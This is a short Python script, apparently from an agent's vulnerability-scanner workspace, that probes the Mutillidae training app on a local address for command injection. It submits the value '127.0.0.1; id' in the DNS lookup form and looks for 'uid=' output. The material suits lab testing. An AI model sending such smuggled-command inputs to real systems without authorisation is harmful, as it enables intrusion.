"""Verify Mutillidae CMDi with correct endpoint"""
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.path.insert(0, "C:/Users/HZR/.qclaw/workspace-agent-b7ed571b/wvs-v18")

import asyncio
import aiohttp
import re

async def test_cmdi():
    # Mutillidae DNS Lookup: action has page in URL, not as hidden field
    url = "http://192.168.18.131/mutillidae/index.php?page=dns-lookup.php"
    
    # POST data (only target_host is the input field)
    data = {
        "target_host": "127.0.0.1; id",
        "dns-lookup-php-submit-button": "Lookup DNS"
    }
    
    print(f"POST {url}")
    print(f"Data: {data}")
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            content = await resp.text()
            print(f"Status: {resp.status}, Length: {len(content)}")
            
            # Look for command output
            if "uid=" in content:
                m = re.search(r"uid=\d+\([^)]+\).*?gid=\d+\([^)]+\)", content)
                if m:
                    print(f"\nVULNERABLE: {m.group(0)}")
                    return True
            
            # Check for PING output
            if "PING" in content:
                print("PING output found (DNS lookup executed)")
            
            return False

if __name__ == "__main__":
    result = asyncio.run(test_cmdi())
    print(f"\n{'CMDi CONFIRMED' if result else 'No CMDi evidence'}")
